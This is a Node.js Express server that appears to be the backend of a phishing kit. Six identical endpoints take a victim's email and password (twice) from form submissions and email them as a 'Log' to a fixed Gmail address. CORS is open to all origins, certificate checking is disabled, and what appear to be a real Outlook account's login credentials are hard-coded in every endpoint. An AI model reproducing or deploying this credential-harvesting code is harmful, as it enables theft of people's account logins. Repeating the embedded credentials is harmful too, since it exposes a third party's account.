const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail5", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

app.post("/sendmail2", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

app.post("/sendmail3", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail4", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail7", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      service: "Outlook365",
      host: "smtp.office365.com",
      port: "587",
      tls: {
        ciphers: "SSLv3",
        rejectUnauthorized: false,
      },
      auth: {
        user: "jbnes67@outlook.com",
        pass: "Johnwick1@",
      },
    });
    let info = await transporter.sendMail({
      from: '"Happy time" <jbnes67@outlook.com>',
      to: "fredrick3smith33@gmail.com",
      subject: "Happy time",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, XXXmannnXXX</p>
         </div>
    `,
    });
    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, console.log(`server in on "5000"`));
